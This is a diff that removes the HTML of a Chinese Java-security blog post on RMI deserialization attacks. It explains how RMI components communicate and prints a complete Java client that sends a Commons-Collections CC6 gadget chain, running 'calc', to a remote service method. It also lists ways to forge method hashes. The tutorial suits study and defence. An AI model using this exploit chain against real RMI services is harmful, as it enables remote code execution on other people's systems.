@@ -1,524 +1,62 @@
-
-<!DOCTYPE html><html lang="zh-CN">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.26.8" theme-name="Stellar" theme-version="1.26.8">
-  
-  <meta name="generator" content="Hexo 7.1.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
-  <link rel="preconnect" href="https://gcore.jsdelivr.net" crossorigin><link rel="preconnect" href="https://unpkg.com" crossorigin><link rel="preconnect" href="https://cdn.bootcdn.net" crossorigin>
-  <meta name="renderer" content="webkit">
-  <meta name="force-rendering" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="theme-color" content="#f8f8f8">
-  
-  <title>漏洞篇 - RMI 相关的攻击 - 妙尽璇机</title>
-
-  
-    <meta name="description" content="攻击 RMI前置知识：基础篇 - RMI 协议详解  我们可以将参与 RMI 远程调用的角色分为三个：Server 端、Registry 端、Client 端（一般来说 Server 端和 Registry 端在一起），它们三者之间都会进行通信，并且全部的通信流程均通过序列化与反序列化实现。基于此，我们可以实现反序列化攻击。 攻击 Server 端参数反序列化如果服务端提供的服务对象参数是 Obj">
-<meta property="og:type" content="article">
-<meta property="og:title" content="漏洞篇 - RMI 相关的攻击">
-<meta property="og:url" content="https://changeyourway.github.io/2024/08/28/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-RMI%E7%9B%B8%E5%85%B3%E7%9A%84%E6%94%BB%E5%87%BB/index.html">
-<meta property="og:site_name" content="妙尽璇机">
-<meta property="og:description" content="攻击 RMI前置知识：基础篇 - RMI 协议详解  我们可以将参与 RMI 远程调用的角色分为三个：Server 端、Registry 端、Client 端（一般来说 Server 端和 Registry 端在一起），它们三者之间都会进行通信，并且全部的通信流程均通过序列化与反序列化实现。基于此，我们可以实现反序列化攻击。 攻击 Server 端参数反序列化如果服务端提供的服务对象参数是 Obj">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240708164106474.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240708165345974.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240708171013758.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709141401511.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709145850132.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709150236473.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709150345553.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709150424485.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709150721649.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709151401926.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240709151518462.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721211770043.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721211872446.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721211268503.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721212058559.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721213910927.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721212591316.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721212763834.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721216307557.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721632318859.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721632447996.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1721654972488.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1723145308331.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1723145501182.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722429509640.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722429678813.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722429748571.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722430065789.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722431232799.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722431161531.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/image-20240731202114052.png">
-<meta property="og:image" content="https://changeyourway.github.io/images/QQ_1722429062866.png">
-<meta property="article:published_time" content="2024-08-28T03:26:44.848Z">
-<meta property="article:modified_time" content="2024-08-28T03:30:01.568Z">
-<meta property="article:author" content="妙尽璇机">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://changeyourway.github.io/images/image-20240708164106474.png">
-  
-  
-  
-  
-
-  <!-- feed -->
-  
-    <link rel="alternate" href="/atom.xml" title="妙尽璇机" type="application/atom+xml">
-  
-
-  <link rel="stylesheet" href="/css/main.css?v=1.26.8">
-
-  
-    <link rel="shortcut icon" href="/assets/favicon/favicon.ico">
-  
-
-  
-
-  
-  <link rel="apple-touch-icon" sizes="180x180" href="/assets/xaoxuu/favicon/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/xaoxuu/favicon/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/xaoxuu/favicon/favicon-16x16.png"><link rel="manifest" href="/assets/xaoxuu/favicon/site.webmanifest"><link rel="shortcut icon" href="/assets/xaoxuu/favicon/favicon.ico"><meta name="theme-color" content="#f8f8f8"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="all" />
-</head>
-<body>
-
-<div class="l_body content tech" id="start" layout="post" ><aside class="l_left"><div class="sidebar-container">
-
-
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://raw.githubusercontent.com/ChangeYourWay/changeyourway.github.io/refs/heads/main/assets/20210722092640_f61bd.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">妙尽璇机</div><div class="sub cap">真理所致，吾心所向</div></a></div></header>
-
-<div class="nav-area">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
-
-
-<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="专栏" href="/topic/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
-</div>
-<div class="widgets">
-
-<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-RMI"><span class="toc-text">攻击 RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-Server-%E7%AB%AF"><span class="toc-text">攻击 Server 端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">参数反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">动态类加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E9%87%8D%E5%86%99%E7%B1%BB"><span class="toc-text">本地重写类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-Registry-%E7%AB%AF"><span class="toc-text">攻击 Registry 端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-Client-%E7%AB%AF"><span class="toc-text">攻击 Client 端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%B8%83%E5%BC%8F%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-DGC"><span class="toc-text">分布式垃圾回收 DGC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3%E5%88%86%E5%B8%83%E5%BC%8F%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6"><span class="toc-text">了解分布式垃圾回收</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-text">RMI 原生反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UnicastRemoteObject-%E7%B1%BB"><span class="toc-text">UnicastRemoteObject 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UnicastRef-%E7%B1%BB"><span class="toc-text">UnicastRef 类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RemoteObject-%E7%B1%BB"><span class="toc-text">RemoteObject 类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div></div></widget>
-
-
-
-
-
-
-
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2025/06/02/CTF/2025%20D%5E3CTF%20Web%20WP/"><span class="title">2025 D^3CTF Web WP</span></a><a class="item title" href="/2024/09/06/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-JNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"><span class="title">漏洞篇 - JNDI 注入详解</span></a><a class="item title" href="/2025/02/20/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - Hessian 反序列化详解</span></a><a class="item title" href="/2025/05/17/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-SnakeYaml%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">漏洞篇 - SnakeYaml 反序列化</span></a><a class="item title" href="/2025/04/30/CTF/2025%20ACTF%20Web%20WP/"><span class="title">2025 ACTF Web 复现</span></a></div></widget>
-</div>
-
-</div></aside><div class="l_main" id="main">
-
-
-
-
-
-<div class="article banner top">
-  <div class="content">
-    
-<div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Java-%E5%AE%89%E5%85%A8/">Java 安全</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-08-28T03:26:44.848Z">2024-08-28</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-08-28T03:30:01.568Z">2024-08-28</time></span></div></div>
-</div>
-
-    
-    <div class="bottom">
-      <div class="text-area">
-        <h1 class="text title"><span>漏洞篇 - RMI 相关的攻击</span></h1>
-      </div>
-    </div>
-    
-  </div>
-  </div><article class="md-text content"><h2 id="攻击-RMI"><a href="#攻击-RMI" class="headerlink" title="攻击 RMI"></a>攻击 RMI</h2><p>前置知识：<a href="https://changeyourway.github.io/2024/07/08/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-RMI%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8D%8F%E8%AE%AE/#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%8E%B7%E5%8F%96-Registry-%E4%BB%A3%E7%90%86%E5%AF%B9%E8%B1%A1">基础篇 - RMI 协议详解</a> </p>
-<p>我们可以将参与 RMI 远程调用的角色分为三个：Server 端、Registry 端、Client 端（一般来说 Server 端和 Registry 端在一起），它们三者之间都会进行通信，并且全部的通信流程均通过序列化与反序列化实现。基于此，我们可以实现反序列化攻击。</p>
-<h3 id="攻击-Server-端"><a href="#攻击-Server-端" class="headerlink" title="攻击 Server 端"></a>攻击 Server 端</h3><h4 id="参数反序列化"><a href="#参数反序列化" class="headerlink" title="参数反序列化"></a>参数反序列化</h4><p>如果服务端提供的服务对象参数是 Object 类型，那么意味着客户端远程调用时可以传递任意类型的参数，这个参数将会被序列化发送到服务端，然后在服务端反序列化。</p>
-<p>例如，服务端的 SayHello 服务有一个方法 eval ，其参数是 Object 类型：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240708164106474.png">
-
-<p>以 CC6 弹计算器为例（前提是服务端有 CC 依赖），客户端传递一个恶意对象：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">package Client;</span><br><span class="line"></span><br><span class="line">import Server.SayHelloInterface;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class CC6Test &#123;</span><br><span class="line">    public static Object getEvilClass() throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 TiedMapEntry ，第二个参数为 key 值，先随便传一个</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, &quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 删除 lazymap 对象中的 key 值</span><br><span class="line">        lazymap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 lazymap 对象的 factory 属性</span><br><span class="line">        Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass();</span><br><span class="line">        Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        return map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        // 连接到服务器 localhost ，端口 1099 :</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class="line">        // 查找名称为 &quot;SayHello&quot; 的服务并强制转型为 SayHelloInterface 类型:</span><br><span class="line">        SayHelloInterface sayHello = (SayHelloInterface) registry.lookup(&quot;SayHello&quot;);</span><br><span class="line">        // 将构造好的 HashMap 对象作为参数传入</span><br><span class="line">        sayHello.eval(getEvilClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>先启动服务端，然后启动客户端，弹出计算器：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240708165345974.png">
-
-<p>参数为 Object 类型就可以传递任意参数，那如果不是 Object 类型呢？</p>
-<p>前面提到客户端调用服务方法时是直接与服务端进行通信的，而服务端使用 UnicastServerRef 的 dispatch 方法来处理客户端的请求。</p>
-<p>在查找方法时，它用方法的 hash 值在 this.hashToMethod_Map 中查找。这个 hash 实际上是一个基于方法签名的 SHA1 hash 值。</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240708171013758.png">
-
-<p>如果说服务的参数不是 Object 类型，但是我们想上传恶意类的话，理论上可以伪造 hash ，这个 hash 在服务端是可以找到对应的方法的，但是实际传递的方法的参数还是恶意类。</p>
-<p>在 mogwailabs 的 [PPT](<a target="_blank" rel="noopener" href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) 中提出了以下 4 种方法：</p>
-<ul>
-<li>通过网络代理，在流量层修改数据</li>
-<li>自定义 “java.rmi” 包的代码，自行实现</li>
-<li>字节码修改</li>
-<li>使用 debugger</li>
-</ul>
-<p>我们来实现一下使用 debugger 的攻击方式，也就是在调试时修改变量值。</p>
-<h6 id="调试时修改变量值"><a href="#调试时修改变量值" class="headerlink" title="调试时修改变量值"></a>调试时修改变量值</h6><p>现在将服务端的方法参数改为 String 类型：</p>
-<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240709141401511.png">
-
-<p>客户端定义了一个 getEvilClass() 方法用来获取 CC6 攻击链最终的 HashMap 对象。</p>
